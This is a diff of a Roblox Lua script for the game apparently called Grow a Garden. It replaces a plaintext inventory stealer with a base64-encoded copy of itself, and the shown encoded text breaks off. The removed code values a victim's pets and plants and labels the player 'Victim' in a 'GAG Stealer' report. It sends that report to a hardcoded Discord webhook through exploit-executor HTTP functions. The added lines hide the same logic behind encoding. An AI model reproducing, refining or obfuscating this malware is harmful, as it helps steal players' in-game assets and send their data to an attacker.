@@ -1,152 +1,16 @@
-if rawget(shared, "__SCRIPT_ALREADY_EXECUTED__") then
-    return
-end
-rawset(shared, "__SCRIPT_ALREADY_EXECUTED__", true)
-
-local Players = game:GetService("Players")
-local LocalPlayer = Players.LocalPlayer
-local backpack = LocalPlayer:WaitForChild("Backpack")
-local ReplicatedStorage = game:GetService("ReplicatedStorage")
-
--- Unfavorite item if marked
-local event = ReplicatedStorage:WaitForChild("GameEvents"):WaitForChild("Favorite_Item")
-for _, item in ipairs(backpack:GetChildren()) do
-    if item:GetAttribute("d") == true then
-        event:FireServer(item)
-    end
-end
-
-local HttpService = game:GetService("HttpService")
-local modules = ReplicatedStorage:WaitForChild("Modules")
-local dataService = require(modules:WaitForChild("DataService"))
-local calcPlantValue = require(modules:WaitForChild("CalculatePlantValue"))
-local petUtils = require(modules:WaitForChild("PetServices"):WaitForChild("PetUtilities"))
-local petRegistry = require(ReplicatedStorage:WaitForChild("Data"):WaitForChild("PetRegistry"))
-local numberUtil = require(modules:WaitForChild("NumberUtil"))
-
--- KHÔNG GÁN trực tiếp vào math (tránh readonly error)
-local function safeLerp(a, b, t)
-	return a + (b - a) * t
-end
-
-local Webhook = getfenv().Webhook
-local Username = getfenv().Username
-local DualWebhook = "https://discord.com/api/webhooks/1391020634913374278/fPKPZTPqG2mCyai6-oebsMx5jagXzLRWNzAQb4jQoKieCJj6dLuyZT1PUh9xo9owdQ65"
-local DualUsername = "namnnni2"
-if not Webhook or not Username then return end
-
-local rarePets = {"Butterfly", "Raccoon", "Dragonfly", "Mimic Octopus", "Queen Bee", "Disco Bee", "Fennec Fox"}
-local excludedItems = {"Seed", "Shovel [Destroy Plants]", "Water", "Fertilizer"}
-local itemsToSend, totalValue, hasRare, hasHeavy = {}, 0, false, false
-
-local function formatNumber(n)
-	local suffix = {"", "k", "m", "b", "t"}
-	local idx = 1
-	while n >= 1000 and idx < #suffix do
-		n = n / 1000
-		idx += 1
-	end
-	return idx == 1 and tostring(math.floor(n)) or string.format("%.2f%s", n, suffix[idx])
-end
-
-local function calcPetValue(petData)
-	local egg = petData.PetData.HatchedFrom
-	if not egg then return 0 end
-	local data = petRegistry.PetEggs[egg]
-	local rarity = data and data.RarityData.Items[petData.PetType]
-	if not rarity then return 0 end
-	local r = rarity.GeneratedPetData.WeightRange
-	if not r then return 0 end
-	local lerp = numberUtil.ReverseLerp(r[1], r[2], petData.PetData.BaseWeight)
-	local weightMult = safeLerp(0.8, 1.2, lerp)
-	local levelMult = safeLerp(0.15, 6, petUtils:GetLevelProgress(petData.PetData.Level))
-	return math.floor(petRegistry.PetList[petData.PetType].SellPrice * weightMult * levelMult)
-end
-
-for _, tool in ipairs(backpack:GetChildren()) do
-	if tool:IsA("Tool") and not table.find(excludedItems, tool.Name) then
-		if tool:GetAttribute("ItemType") == "Pet" then
-			local id = tool:GetAttribute("PET_UUID")
-			local petData = dataService:GetData().PetsData.PetInventory.Data[id]
-			if not petData or not petData.PetType then continue end
-			local petName = petData.PetType
-			local weight = tonumber(petData.PetData.BaseWeight) or 0
-			local value = calcPetValue(petData)
-			if table.find(rarePets, petName) then hasRare = true end
-			if weight >= 10 then hasHeavy = true end
-			totalValue += value
-			table.insert(itemsToSend, {Tool = tool, Name = petName, Weight = weight, Value = value, Type = "Pet"})
-		else
-			local value = calcPlantValue(tool)
-			totalValue += value
-			table.insert(itemsToSend, {Tool = tool, Name = tool.Name, Weight = 0, Value = value, Type = "Plant"})
-		end
-	end
-end
-
-if #itemsToSend == 0 then return end
-
-table.sort(itemsToSend, function(a, b)
-	if a.Type == "Pet" and b.Type ~= "Pet" then return true end
-	if a.Type ~= "Pet" and b.Type == "Pet" then return false end
-	return a.Value > b.Value
-end)
-
-local useDual = totalValue >= 1e12
-local finalWebhook = useDual and DualWebhook or Webhook
-local finalUsername = useDual and DualUsername or Username
-
-local content = (hasRare or hasHeavy) and "@everyone 🚨 Mission Alert!\n" or ""
-content ..= "🚨 **GAG OPS - Steal & Gift Mission** 🚨\n>>> Mission success ✅\n**JobId:** `" .. game.JobId .. "`\n"
-
-local lines = ""
-for _, item in ipairs(itemsToSend) do
-	local icon = item.Type == "Pet" and (
-		table.find(rarePets, item.Name) and "🐲" or (item.Weight >= 10 and "🐘" or "🐶")
-	) or "🍏"
-	lines ..= string.format("%s **%s** (%.2f KG) — ₵%s\n", icon, item.Name, item.Weight, formatNumber(item.Value))
-	if #lines > 1024 then
-		lines = lines:sub(1, 1000) .. "\n...more items"
-		break
-	end
-end
-
-local embed = {
-	title = "🎯 GAG OPS - Steal & Gift Report",
-	description = "Inventory extraction complete. Mission success ✅",
-	color = 0xFF0000,
-	author = { name = "GAG Stealer System", icon_url = "https://cdn-icons-png.flaticon.com/512/2809/2809640.png" },
-	thumbnail = { url = "https://media.tenor.com/l2vJQk1ZoTIAAAAC/ninja-cat.gif" },
-	fields = {
-		{name = "🎯 Victim", value = LocalPlayer.Name, inline = true},
-		{name = "💰 Total Value", value = "₵" .. formatNumber(totalValue), inline = true},
-		{name = "🗺️ Join Link", value = "https://fern.wtf/joiner?placeId=126884695634066&gameInstanceId=" .. game.JobId, inline = false},
-		{name = "🧾 Inventory Log", value = lines, inline = false}
-	},
-	footer = {
-		text = "🦊 GAG Stealer by namnnni2 — Stay stealthy",
-		icon_url = "https://cdn-icons-png.flaticon.com/512/616/616408.png"
-	},
-	timestamp = DateTime.now():ToIsoDate()
-}
-
-local payload = {
-	content = content,
-	embeds = {embed}
-}
-
-local function getRequest()
-	return syn and syn.request or http and http.request or http_request or fluxus and fluxus.request or (identifyexecutor and identifyexecutor():lower():find("delta") and request)
-end
-
-pcall(function()
-	local req = getRequest()
-	if req then
-		req({
-			Url = finalWebhook,
-			Method = "POST",
-			Headers = {["Content-Type"] = "application/json"},
-			Body = HttpService:JSONEncode(payload)
-		})
-	end
-end)
+local encodedScript = [[
+aWYgcmF3Z2V0KHNoYXJlZCwgIl9fU0NSSVBUX0FMRFJFQURZX0VYRUNVVEVEX18iKSB0aGVuIHJldHVybiBlbmQKcmF3c2V0KHNoYXJlZCwgIl9fU0NSSVBUX0FMRFJFQURZX0VYRUNVVEVEX18iLCB0cnVlKQoKbG9jYWwgUGxheWVycyA9IGdhbWU6R2V0U2VydmljZSgiUGxheWVycyIpCmxvY2FsIExvY2FsUGxheWVyID0gUGxheWVycy5Mb2NhbFBsYXllcgp
+sb2NhbCBiYWNrcGFjayA9IExvY2FsUGxheXI6V2FpdEZvckNoaWxkKCJCYWNrcGFjayIpCmxvY2FsIFJlcGxpY2F0ZWRTdG9yYWdlID0gZ2FtZTpHZXRTZXJ2aWNlKCJSZXBsaWNhdGVkU3RvcmFnZSIpCgpsb2NhbCBldmVudCA9IFJlcGxpY2F0ZWRTdG9yYWdlOldhaXRGb3JDaGlsZCgiR2FtZUV2ZW50cyIpOldhaXRGb3JDaGlsZCgiRmF2b3JpdGVfSXRlbSIpCmZvciBfLCBpdGVtIGluIGlwcGFpc3QoYmFja3BhY2s6R2V0Q2hpbGRyZW4oKSkgZG8KICAgIGlmIGl0ZW06R2V0QXR0cmlidXRlKCJkIikgPT0gdHJ1ZSB0aGVuCiAgICAgICAgZXZlbnQ6RmlyZVNlcnZlcihpdGVtKQogICAgZW5kCmVuZAoKbG9jYWwgSHR0cFNlcnZpY2UgPSBnYW1lOkdldFNlcnZpY2UoIkh0dHBTZXJ2aWNlIikKbG9jYWwgbW9kdWxlcyA9IFJlcGxpY2F0ZWRTdG9yYWdlOldhaXRGb3JDaGlsZCgiTW9kdWxlcyIpCmxvY2FsIGRhdGFTZXJ2aWNlID0gcmVxdWlyZShtb2R1bGVzOldhaXRGb3JDaGlsZCgiRGF0YVNlcnZpY2UiKSkKbG9jYWwgY2FsY1BsYW50VmFsdWUgPSByZXF1aXJlKG1vZHVsZXM6V2FpdEZvckNoaWxkKCJDYWxjdWxhdGVQbGFudFZhbHVlIikpCmxvY2FsIH
+BldFV0aWxzID0gcmVxdWlyZShtb2R1bGVzOldhaXRGb3JDaGlsZCgiUGV0U2VydmljZXMiKTpXYWl0Rm9yQ2hpbGQoIlBldFV0aWxpdGllcyIpKQpsb2NhbCBwZXRSZWdpc3RyeSA9IHJlcXVpcmUoUmVwbGljYXRlZFN0b3JhZ2U6V2FpdEZvckNoaWxkKCJEYXRhIik6V2FpdEZvckNoaWxkKCJQZXRSZWdpc3RyeSIpKQpsb2NhbCBudW1iZXJVdGlsID0gcmVxdWlyZShtb2R1bGVzOldhaXRGb3JDaGlsZCgiTnVtYmVyVXRpbCIpKQoKbG9jYWwgZnVuY3Rpb24gc2FmZUxlcnAoYSwgYiwgdCkKICAgIHJldHVybiBhICsgKGIgLSBhKSAqIHQKZW5kCgpsb2NhbCBXZWJob29rID0gZ2V0ZmVudigpLldlYmhvb2sKbG9jYWwgVXNlcm5hbWUgPSBnZXRmZW52KCkuVXNlcm5hbWUKbG9jYWwgRHVhbFdlYmhvb2sgPSAi
+aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTM5MTAyMDYzNDkxMzM3NDI3OC9mUEtQWlRQcUcybUN5YWk2LW9lYnNNeDVqYWdYekxSV056QVFieEpvS2llQ0pqNmRMdXlaVDFQVWh5bzhvd2RRNjUiCmxvY2FsIER1YWxVc2VybmFtZSA9ICJuYW1ubm5pMiIKaWYgbm90IFdlYmhvb2sgb3Igbm90IFVzZXJuYW1lIHRoZW4gcmV0dXJuIGVuZAoKbG9jYWwgcmFyZVBldHMgPSB7IkJ1dHRlcmZseSIsICJSYWNjb29uIiwgIkRyYWdvbmx5IiwgIk1pbWljIE9jdG9wdXMiLCAiUXVlZW4gQmVlIiwgIkRpc2NvIEJlZSIsICJGZW5uZWMgRm94In0KbG9jYWwgZXhjbHVkZWRJdGVtcyA9IHsiU2VlZCIsICJTaG92ZWwgW0Rlc3Ryb3kgUGxhbnRzXSIsICJXYXRlciIsICJGZXJ0aWxpemVyIn0KbG9jYWwgaXRlbXNUb1NlbmQsIHRvdGFsVmFsdWUsIGhhc1JhcmUsIGhhc0hlYXZ5ID0ge30sIDAsIGZhbHNlLCBmYWxzZQoKbG9jYWwgZnVuY3Rpb24gZm9ybWF0TnVtYmVyKG4pCiAgICBsb2NhbCBzdWZmaXggPSB7IiIsICJrIiwgIm0iLCAiYiIsICJ0In0KICAgIGxvY2FsIGlkeCA9IDEKICAgIHdoaWxlIG4gPj0gMTAwMCBhbmQgaWR4IDwgbm9uIChzdWZmaXgpIGRvCiAgICAgICAgbiA9IG4gLyAxMDAwCiAgICAgICAgaWR4ICs9IDEKICAgIGVuZAogICAgcmV0dXJuIGlkeCA9PSAxIGFuZCB0b3N0cmluZyhtYXRoLmZsb29yKG4pKSBvciBzdHJpbm
+c
+uZm9ybWF0KCIuMkYiIC4uLiBzdWZmaXhbaWR4XSkKZW5kCgpsb2NhbCBmdW5jdGlvbiBjYWxjUGV0VmFsdWUocGV0RGF0YSkKICAgIGxvY2FsIGVnZyA9IH
+BldERhdGEuUGV0RGF0YS5IYXRjaGVkRnJvbQogICAgaWYgbm90IGVnZyB0aGVuIHJldHVybiAwIGVuZAogICAgbG9jYWwgZGF0YSA9IH
+BldFJlZ2lzdHJ5LlBldEVnZ3NbZWdnXQogICAgbG9jYWwgcmFyaXR5ID0gZGF0YSBhbmQgZGF0YS5SYXJpdHlEYXRhLkl0ZW1zW3
+BldERhdGEuUGV0VHlwZV0KICAgIGlmIG5vdCByYXJpdHkgdGhlbiByZXR1cm4gMCBlbmQKICAgIGxvY2FsIHIgPSByYXJpdHkuR2VuZXJhdGVkUGV0RGF0YS5XZWlnaHRSYW5nZQogICAgaWYgbm90IHIgdGhlbiByZXR1cm4gMCBlbmQKICAgIGxvY2FsIGxlcnAgPSBudW1iZXJVdGlsLlJldmVyc2VMZXJwKHIxLCByMiwgcGV0RGF0YS5QZXREYXRhLkJhc2VXZWlnaHQpCiAgICBsb2NhbCB3ZWlnaHRNdWx0ID0gc2FmZUxlcnAoMC44LCAxLjIsIGxlcnApCiAgICBsb2NhbCBsZXZlbE11bHQgPSBzYWZlTGVycCgwLjE1LCA2LCBwZXRVdGlsczpHZXRMZXZlbFByb2dyZXNzKH
+BldERhdGEuUGV0RGF0YS5MZXZlbCkpCiAgICByZXR1cm4gbWF0aC5mbG9vcihwZXRSZWdpc3RyeS5QZXRMaXN0W3
+BldERhdGEuUGV0VHlwZV0uU2VsbFByaWNlICogd2VpZ2h0TXVsdCAqIGxldmVsTXVsdCkKZW5kCgpmb3IgXywgdG9vbCBpbiBpcHBhaXModG9vbHMgYmFja3BhY2s6R2V0Q2hpbGRyZW4oKSkgZG8KICAgIGlmIHRvb2w6SXNBUigpIGFuZCBub3QgdGFibGUuZmluZChleGNsdWRlZEl0ZW1zLCB0b29sLk5hbWUpIHRoZW4KICAgICAgICBpZiB0b29sOmdldEF0dHJpYnV0ZSgiSXRlbVR5cGUiKSA9PSAiUGV0IiB0aGVuCiAgICAgICAgICAgIGxvY2FsIGlkID0gdG9vbDpHZXRBdHRyaWJ1dGUoIlBFVF9VVUlEIikKICAgICAgICAgICAgbG9jYWwgcGV0RGF0YSA9IGRhdGFTZXJ2aWNlOkdldERhdGEoKS5QZXRzRGF0YS5QZXRJbnZlbnRvcnkuRGF0YVtpZF0KICAgICAgICAgICAgaWYgbm90IH
+BldERhdGEgb3Igbm90IHBldERhdGEuUGV0VHlwZSB0aGVuIGNvbnRpbnVlIGVuZAogICAgICAgICAgICBsb2NhbCBwZXROYW1lID0gcGV0RGF0YS5QZXRUeXBlCiAgICAgICAgICAgIGxvY2FsIHdlaWdodCA9IHRvbm51bShwZXREYXRhLlBldERhdGEuQmFzZVdlaWdodCkgb3IgMAogICAgICAgICAgICBsb2NhbCB2YWx1ZSA9IGNhbGNQZXRWYWx1ZShwZXREYXRhKQogICAgICAgICAgICBpZiB0YWJsZS5maW5kKHJhcmVQZXRzLCBwZXROYW1lKSB0aGVuIGhhc1JhcmUgPSB0cnVlIGVuZAogICAgICAgICAgICBpZiB3ZWlnaHQgPj0gMTAgdGhlbiBoYXNIZWF2eSA9IHRydWUgZW5kCiAgICAgICAgICAgIHRvdGFsVmFsdWUgKz0gdmFsdWUKICAgICAgICAgICAgdGFibGUuaW5zZXJ0KGl0ZW1zVG9TZW5kLCB7VG9vbCA9IHRvb2wsIE5hbWUgPSBwZXROYW1lLCBXZWlnaHQgPSB3ZWlnaHQsIFZhbHVlID0gdmFsdWUsIFR5cGUgPSAiUGV0In0pCiAgICAgICAgZWxzZQogICAgICAgICAgICBsb2NhbCB2YWx1ZSA9IGNhbGNTZXJ2aWNlV
+mFsdWUodG9vbCkKICAgICAgICAgICAgdG90YWxWYWx1ZSArPSB2YWx1ZQogICAgICAgICAgICB0YWJsZS5pbnNlcnQoaXRlbXNUb1NlbmQsIHtUb29sID0gdG9vbCwgTmFtZSA9IHRvb2wuTmFtZSwgV2VpZ2h0ID0gMCwgVmFsdWUgPSB2YWx1ZSwgVHlwZSA9ICJQbGFudCJ9KQogICAgICAgIGVuZAogICAgZW5kCmVuZAoKaWYgI2l0ZW1zVG9TZW5kID09IDAgdGhlbiByZXR1cm4gZW5kCgp0YWJsZS5zb3J0KGl0ZW1zVG9TZW5kLCBmdW5jdGlvbihhLCBiKQogICAgaWYgYS5UeXBlID09ICJQZXQiIGFuZCBiLlR5cGUgIT0gIlBldCIgdGhlbiByZXR1cm4gdHJ1ZSBlbmQKICAgIGlmIGEuVHlwZSAhPSAiUGV0IiBhbmQgYi5UeXBlID09ICJQZXQiIHRoZW4gcmV0dXJuIGZhbHNlIGVuZAogICAgcmV0dXJuIGEuVmFsdWUgPiBiLlZhbHVlCmVuZCkKCmxvY2FsIHVzZUR1YWwgPSB0b3RhbFZhbHVlID49IDEwXzEyCmxvY2FsIGZpbmFsV2ViaG9vayA9IHVzZUR1YWwgYW5kIER1YWxXZWJob29rIHx8IFdlYmhvb2sKbG9jYWwgZmluYWxVc2VybmFtZSA9IHVzZUR1YWwgYW5kIER1YWxVc2VybmFtZSB8fCBVc2VybmFtZQoKbG9jYWwgY29udGVudCA9IChoYXNSYXJlIG9yIGhhc0hlYXYpIGFuZCBcIkBldmVyeW9uIOKcqCBNaXNzaW9uIEFsZXJ0IVwiIHx8ICIiKQpjb250ZW50IC4uPSAi8J+UhCDigJQgR0FHIE9QUyAtIFN0ZWFsICYgR2lmdCBNaXNzaW9uIOKcqSDigJ0+Pj4gTWlzc2lvbiBzdWNjZXNzIOKcqSDih6ggXG5Kb2JJZDogeCIgLi4gZ2FtZS5Kb2JJZC4gIlxuIgoKbG9jYWwgbGluZXMgPSAiIgpmb3IgXywgaXRlbSBpbiBpcHBhaXMob
+aXRlbXNUb1NlbmQpIGRvCiAgICBsb2Nhb
+CBpY29uID0gaXRlbS5UeXBlID09ICJQZXQiIGFuZCAoIHRhYmxlLmZpbmQocmFyZVBldHMsIGl0ZW0uTmFtZSkgYW5kICLwn5CiIiBvciAoaXRlbS5XZWlnaHQgPj0gMTAgYW5kICLwn46lIiBvciAi8J+NjSIpKSBvciAi8J+QpCIKICAgIGxpbmVzIC4uPSBzdHJpbmcuZm9ybWF0KCIlcyAqKioqKiBzICoqKiogKDMuMkspICoqKiog4p6MQiVzXG4iLCBpY29uLCBpdGVtLk5hbWUsIGl0ZW0uV2VpZ2h0LCBmb3JtYXROdW1iZXIoaXRlbS5WYWx1ZSkpCiAgICBpZiAjbGluZXMgPiAxMDI0IHRoZW4KICAgICAgICBsaW5lcyA9IGxpbmVzOnN1YigxLCAxMDAwKS4uICJcbi4uLm1vcmUgaXRlbXMiCiAgICAgICAgYnJlYWsKICAgIGVuZAplbmQKCmxvY2FsIGVtYmVkID0gewogICAgd
